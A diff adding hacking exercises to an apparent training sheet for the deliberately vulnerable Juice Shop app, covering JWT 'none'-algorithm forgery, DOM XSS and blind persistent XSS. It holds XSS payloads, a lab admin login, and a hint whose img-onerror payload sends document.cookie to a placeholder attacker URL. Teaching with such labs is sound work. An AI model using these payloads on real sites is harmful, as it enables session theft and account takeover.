@@ -170,3 +170,75 @@ How can this be exploited, when the access verification happens in node.js?
   <summary>❓ Hint 2</summary>
 A url encoded null byte is represented as "%00", however, make sure you properly encode it when submitting the request.
 </details>
+
+
+## Federated Authentication
+
+Find a website with a social login and use ZAP to observe what happens when you sign in.  
+Example: https://oag.azurewebsites.net
+
+
+## JSON Web Token
+Analyze a JWT from the shop with https://jwt-attacker.onrender.com
+
+- What claims are in the token?
+- How is it signed?
+
+
+## Unsigned JWT
+
+Forge an essentially unsigned JWT that impersonates the (non-existing) user jwtn3d@juice-sh.op.
+
+<details>
+  <summary>❓ Hint 1</summary>
+Exploit a weird option, that is available when signing tokens with JWT.
+</details>
+
+<details>
+  <summary>❓ Hint 2</summary>
+The weird option is the none algorithm ;)
+</details>
+
+
+## DOM XSS
+
+Perform a DOM XSS attack with the following payload: `<iframe src="javascript:alert(`xss`)">`.
+
+<details>
+  <summary>❓ Hint 1</summary>
+Did you try searching?
+</details>
+
+
+## Blind Persistent XSS
+
+Perform a (blind) persistent XSS attack bypassing a client-side security mechanism.
+
+- The admin can see a list of all users on `/#/administration`
+- Admin login: admin@juice-sh.op / admin123
+
+Can you extract the cookies and send it to you (https://requestbin.net/ might be helpful)?
+
+<details>
+  <summary>❓ Hint 1</summary>
+What information is displayed to the admin? When can you set it?
+</details>
+
+<details>
+  <summary>❓ Hint 2</summary>
+When registering a new user the endpoint `/api/Users` is contacted. This looks interesting...
+</details>
+
+<details>
+  <summary>❓ Hint 3 (Cookie exfiltration)</summary>
+Have you tried the following?
+```
+<img src=x onerror="this.src='YOUR.URL?'+document.cookie; this.removeAttribute('onerror');">
+```
+</details>
+
+
+## Content Security Policy
+
+Search for a websites with a CSP. How does the CSP of your favorite bank look like?
+
